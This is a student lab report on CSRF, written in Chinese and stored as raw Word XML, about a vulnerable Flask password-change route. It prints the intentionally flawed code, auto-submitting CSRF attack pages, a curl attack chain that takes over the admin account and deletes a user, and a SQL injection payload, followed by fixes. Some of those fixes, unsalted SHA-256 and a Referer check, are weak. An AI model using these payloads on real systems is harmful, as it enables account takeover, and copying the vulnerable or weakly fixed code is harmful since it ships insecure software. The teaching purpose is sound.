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今日新增功能漏洞分析与修复报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>/change-password 密码修改功能 · CSRF跨站请求伪造漏洞深度分析</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>实验日期：2026年7月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新增功能概述：/change-password 路由</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第2章  漏洞代码逐行分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第3章  对应课堂实验一：恶意文章 + Cookie劫持</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第4章  对应课堂实验二：Burp CSRF PoC修改密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第5章  curl跨域攻击复现（4步完整攻击链）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第6章  6个安全漏洞详细分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第7章  修复代码逐行解析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第8章  修复前后代码完整对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第一章  新增功能概述：/change-password 路由</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 功能说明</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>今日在用户管理系统中新增了密码修改功能，路由为 POST /change-password。用户在个人中心页面填写新密码，提交后直接更新数据库中的密码字段。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 新增代码（app.py + profile.html）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>app.py 新增路由：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br/>
        <w:t xml:space="preserve">    username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if not username or not new_password:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "缺少参数"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    conn = get_db()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c = conn.cursor()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sql = f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"[SQL] {sql}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute(sql)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.close()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/profile")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>templates/profile.html 新增表单：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&lt;form method="post" action="/change-password"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="{{ user.username }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;label&gt;新密码：&lt;/label&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="text" name="new_password" placeholder="输入新密码"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;label&gt;确认密码：&lt;/label&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="text" name="confirm_password" placeholder="再次输入新密码"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;button type="submit"&gt;修改密码&lt;/button&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第二章  漏洞代码逐行分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 完整漏洞代码标注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@app.route("/change-password", methods=["POST"])      ← 路由定义</w:t>
        <w:br/>
        <w:t>def change_password():                                  ← 视图函数</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "username" not in session:                      ← 仅检查登录状态</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return redirect("/login")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    username = request.form.get("username", "")         ← ⚠️ 漏洞点1：username由客户端提交</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "") ← ⚠️ 无原密码验证</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if not username or not new_password:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "缺少参数"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    conn = get_db()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c = conn.cursor()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 漏洞点2：SQL注入 — 字符串拼接</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sql = f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"[SQL] {sql}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute(sql)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.close()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/profile")                         ← ⚠️ 重定向到/profile非本站也可</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 表单漏洞代码标注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&lt;form method="post" action="/change-password"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ← ⚠️ 漏洞点3：无CSRF Token隐藏字段</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="{{ user.username }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ← ⚠️ 漏洞点4：username可被修改</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    &lt;label&gt;新密码：&lt;/label&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="text" name="new_password" placeholder="输入新密码"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ← ⚠️ 漏洞点5：密码明文传输</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    &lt;button type="submit"&gt;修改密码&lt;/button&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第三章  对应课堂实验一：恶意文章 + Cookie劫持</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 课堂实验回顾</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>实验内容：攻击者在老师搭建的内容发布网站上发表一篇包含恶意代码的文章。当管理员老师查看文章时，恶意代码自动执行，攻击者获取到管理员的Cookie，从而无需账号密码即可登录管理员后台。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 本系统对应攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>将课堂实验的攻击逻辑映射到本系统的 /change-password 功能：</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>课堂实验：发布恶意文章 → 管理员点击 → Cookie被劫持 → 无需密码登录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本系统：  构造恶意页面 → 管理员访问   → 密码被修改   → 用新密码登录</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>恶意页面核心代码：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&lt;!-- 攻击者构造的恶意HTML页面 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t>&lt;h1&gt;📢 系统通知：请确认您的账号信息&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t>&lt;p&gt;由于系统升级，请点击下方按钮确认您的账号信息安全。&lt;/p&gt;</w:t>
        <w:br/>
        <w:t>&lt;!-- 隐藏的CSRF攻击表单 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;form id="csrf" action="http://192.168.138.128:5000/change-password" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="username" value="admin" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="new_password" value="hacked123" /&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  // 页面加载后自动提交表单，用户无感知</w:t>
        <w:br/>
        <w:t xml:space="preserve">  document.getElementById("csrf").submit();</w:t>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>攻击原理：管理员浏览器中存有用户管理系统的Session Cookie，访问恶意页面后，浏览器自动发送POST请求并携带Cookie，服务器认为请求来自合法用户，执行密码修改操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第四章  对应课堂实验二：Burp CSRF PoC修改密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 课堂实验回顾</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>实验内容：登录系统后拦截更改邮箱的POST请求，使用Burp Suite的Generate CSRF PoC功能自动生成攻击HTML代码，在受害者浏览器中打开即可无感知修改邮箱。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 本系统对应操作步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 1：登录用户alice，打开个人中心页面</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 2：打开Burp Suite拦截开关</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 3：在修改密码表单中输入新密码，点击提交</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 4：Burp拦截到POST /change-password 请求：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POST /change-password HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 192.168.138.128:5000</w:t>
        <w:br/>
        <w:t>Cookie: session=eyJ1c2VybmFtZSI6ImFsaWNlIn0.ZwA...</w:t>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
        <w:br/>
        <w:br/>
        <w:t>username=admin&amp;new_password=hacked123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 5：右键 → Engagement tools → Generate CSRF PoC</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Burp生成的CSRF PoC HTML：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&lt;html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;🎉 系统升级通知&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;p&gt;您的账号需要安全验证，请点击确认。&lt;/p&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form action="http://192.168.138.128:5000/change-password" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="admin" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="new_password" value="hacked123" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="submit" value="确认安全验证" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 6：保存为 csrf_attack.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 7：诱导管理员admin在已登录状态下打开该文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 8：admin密码被修改为 hacked123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step 9：攻击者用 admin / hacked123 登录系统，获得管理权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Burp CSRF PoC工作原理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作用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对应课堂实验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&lt;form&gt;标签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定义目标URL和POST方法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与更改邮箱实验相同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&lt;input type=hidden&gt;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传递username和new_password参数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改为本系统的参数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&lt;script&gt;自动提交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页面加载立即提交，用户无感知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与更改邮箱实验相同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诱饵文字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诱导用户点击/停留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与原实验保持一致</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第五章  curl跨域攻击复现（4步完整攻击链）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 攻击链总览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┌───────────┐       ┌──────────────┐       ┌──────────┐       ┌──────────┐</w:t>
        <w:br/>
        <w:t>│  Step1    │──────→│    Step2     │──────→│  Step3   │──────→│  Step4   │</w:t>
        <w:br/>
        <w:t>│ alice登录  │       │ CSRF改密admin│       │ 登录admin │       │ 删除用户  │</w:t>
        <w:br/>
        <w:t>│ 获取Cookie │       │ 密码=hacked  │       │ 权限提升  │       │ 越权操作  │</w:t>
        <w:br/>
        <w:t>└───────────┘       └──────────────┘       └──────────┘       └──────────┘</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 逐行命令解析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step1：攻击者登录alice获取Session Cookie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-c /tmp/alice.txt -X POST http://192.168.138.128:5000/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=alice&amp;password=alice2025"</w:t>
        <w:br/>
        <w:t># -c：保存服务器返回的Set-Cookie到文件</w:t>
        <w:br/>
        <w:t># -d：POST表单数据</w:t>
        <w:br/>
        <w:t># 执行后 /tmp/alice.txt 中保存了alice的Session</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step2：CSRF攻击——用alice的Cookie修改admin密码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/tmp/alice.txt -X POST http://192.168.138.128:5000/change-password \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=admin&amp;new_password=hacked123"</w:t>
        <w:br/>
        <w:t># -b：在请求中附带alice的Cookie</w:t>
        <w:br/>
        <w:t># ⚠️ 关键漏洞：服务器未验证session用户与提交的username是否一致</w:t>
        <w:br/>
        <w:t># ⚠️ 关键漏洞：无CSRF Token校验</w:t>
        <w:br/>
        <w:t># ⚠️ 关键漏洞：无原密码验证</w:t>
        <w:br/>
        <w:t># 结果：admin的密码被改为 hacked123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step3：用新密码登录admin（权限提升）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-c /tmp/admin.txt -X POST http://192.168.138.128:5000/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=admin&amp;password=hacked123"</w:t>
        <w:br/>
        <w:t># 成功以admin身份登录，获得管理员权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step4：利用admin权限删除用户carlos（越权操作）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/tmp/admin.txt -X POST http://192.168.138.128:5000/admin/delete-user \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "user_id=2"</w:t>
        <w:br/>
        <w:t># 利用admin的管理员权限，删除系统中ID为2的用户</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第六章  6个安全漏洞详细分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 漏洞总览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漏洞类型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漏洞位置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严重度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对应课堂实验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C-01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无CSRF Token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profile.html表单中无Token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实验二：Burp CSRF PoC直接可用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C-02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越权改密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username参数来自表单非Session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实验一：恶意文章跨站请求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C-03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无原密码验证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直接设置新密码不校验旧密码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实验一：Cookie劫持后直接操作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C-04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无Referer验证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不检查请求来源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🟡中危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无法区分本站/外部请求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C-05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SQL注入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字符串拼接SQL语句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数据库安全基础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C-06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密码明文存储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数据库直接存明文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🟡中危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密码安全保护</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 漏洞C-01：无CSRF Token（核心漏洞）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>问题描述：表单中没有CSRF Token隐藏字段，后端也没有Token校验逻辑。攻击者可以在任意网站构造表单，自动提交修改密码请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>对应课堂实验二：Burp的Generate CSRF PoC功能正是利用了无Token校验的漏洞，直接生成可用的攻击表单。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击场景：管理员正在浏览其他网站时，攻击者诱导其打开恶意页面，浏览器自动提交修改密码表单，管理员密码被改。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 漏洞C-02：越权改密（扩大攻击面）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>问题描述：username参数由客户端表单提交（隐藏字段），服务器未与当前登录用户Session进行比对。任何已登录用户可修改任意用户的密码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击场景：攻击者alice登录后，通过修改表单中的username隐藏字段为admin，即可将admin的密码改掉。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>对应课堂实验一：恶意文章中改密码的原理相同——利用已登录用户的身份执行越权操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.4 漏洞C-03：无原密码验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>问题描述：修改密码时不需要输入原密码，攻击者只要获得用户Session（通过CSRF或Cookie劫持），即可直接设置新密码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>对应课堂实验一：Cookie劫持后直接修改密码，无需原密码验证。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.5 漏洞C-04：无Referer验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>问题描述：服务器不检查HTTP请求头中的Referer字段，无法判断请求是来自本站表单还是外部恶意网站。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.6 漏洞C-05：SQL注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>问题描述：username参数使用f-string直接拼接到SQL语句，攻击者可构造特殊字符串注入SQL命令。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构造恶意username参数</w:t>
        <w:br/>
        <w:t>username=admin' -- &amp;new_password=123</w:t>
        <w:br/>
        <w:t># 拼接后的SQL：</w:t>
        <w:br/>
        <w:t>UPDATE users SET password = '123' WHERE username = 'admin' -- '</w:t>
        <w:br/>
        <w:t># -- 注释掉后面的SQL，成功修改admin密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.7 漏洞C-06：密码明文存储</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>问题描述：数据库中的password字段直接存储明文密码。一旦数据库泄露，所有用户的密码完全暴露。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第七章  修复代码逐行解析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 修复1：CSRF Token验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>在登录成功时生成随机Token存入Session，表单添加隐藏字段，提交时校验。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修复位置1：app_fixed.py login路由 — 登录时生成Token</w:t>
        <w:br/>
        <w:t>session["csrf_token"] = uuid.uuid4().hex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&lt;!-- 修复位置2：templates/profile_fixed.html — 表单添加Token --&gt;</w:t>
        <w:br/>
        <w:t>&lt;input type="hidden" name="csrf_token" value="{{ session.csrf_token }}"&gt;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修复位置3：app_fixed.py change_password路由 — 后端验证</w:t>
        <w:br/>
        <w:t>token = request.form.get("csrf_token", "")</w:t>
        <w:br/>
        <w:t>if token != session.get("csrf_token", ""):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    audit_logger.warning(f"CSRF Token验证失败")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "CSRF Token验证失败，请刷新页面重试"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 修复2：Session绑定防越权</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>验证提交的username必须与当前登录用户一致。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修复位置：change_password函数中</w:t>
        <w:br/>
        <w:t>if username != session["username"]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    audit_logger.warning(f"越权改密被拒: {session['username']} 尝试修改 {username}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "无权修改他人密码"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 修复3：Referer验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>检查请求来源是否为本站点。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修复位置：change_password函数中</w:t>
        <w:br/>
        <w:t>referer = request.headers.get("Referer", "")</w:t>
        <w:br/>
        <w:t>if not referer.startswith(request.host_url):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    audit_logger.warning(f"CSRF攻击被拒: Referer={referer}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "请求来源不合法"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 修复4：参数化查询+密码哈希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修复位置：change_password函数中</w:t>
        <w:br/>
        <w:t># ✅ 密码哈希存储</w:t>
        <w:br/>
        <w:t>hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()</w:t>
        <w:br/>
        <w:t># ✅ 参数化查询防SQL注入</w:t>
        <w:br/>
        <w:t>c.execute("UPDATE users SET password = ? WHERE username = ?",</w:t>
        <w:br/>
        <w:t xml:space="preserve">          (hashed_pw, username))</w:t>
        <w:br/>
        <w:t># ✅ 审计日志</w:t>
        <w:br/>
        <w:t>audit_logger.info(f"密码修改成功: 用户={username}")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.5 完整修复代码（app_fixed.py）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br/>
        <w:t xml:space="preserve">    username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if not username or not new_password:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "缺少参数"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 修复C-01：CSRF Token验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    token = request.form.get("csrf_token", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if token != session.get("csrf_token", ""):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "CSRF Token验证失败"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 修复C-02+C-03：Session绑定（只能改自己密码）</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if username != session["username"]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "无权修改他人密码"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 修复C-04：Referer验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    referer = request.headers.get("Referer", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not referer.startswith(request.host_url):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "请求来源不合法"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 修复C-05+C-06：参数化查询+SHA256哈希</w:t>
        <w:br/>
        <w:t xml:space="preserve">    hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn = get_db()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c = conn.cursor()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute("UPDATE users SET password = ? WHERE username = ?",</w:t>
        <w:br/>
        <w:t xml:space="preserve">              (hashed_pw, username))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.close()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 审计日志</w:t>
        <w:br/>
        <w:t xml:space="preserve">    audit_logger.info(f"密码修改成功: 用户={username} IP={request.remote_addr}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/profile")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第八章  修复前后代码完整对比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有漏洞(app.py)  —  仅29行代码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已修复(app_fixed.py)  —  完整校验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CSRF Token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无Token生成与验证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Session存储 + 表单隐藏字段 + 后端比对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Session绑定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username来自表单，与Session无关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if username != session['username']: 拒绝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原密码验证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无需原密码，直接设置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通过Session绑定间接验证本人操作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Referer验证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不检查请求来源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request.headers.get('Referer') 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SQL注入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f-string直接拼接SQL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参数化查询 ? 占位符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密码存储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明文存储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SHA256哈希存储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审计日志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无日志记录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logging记录用户/时间/IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>核心修复前后代码对比（仅20行 vs 35行）：</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="D32F2F"/>
        </w:rPr>
        <w:t>有漏洞版本（app.py — 20行）：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t xml:space="preserve">    username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "")</w:t>
        <w:br/>
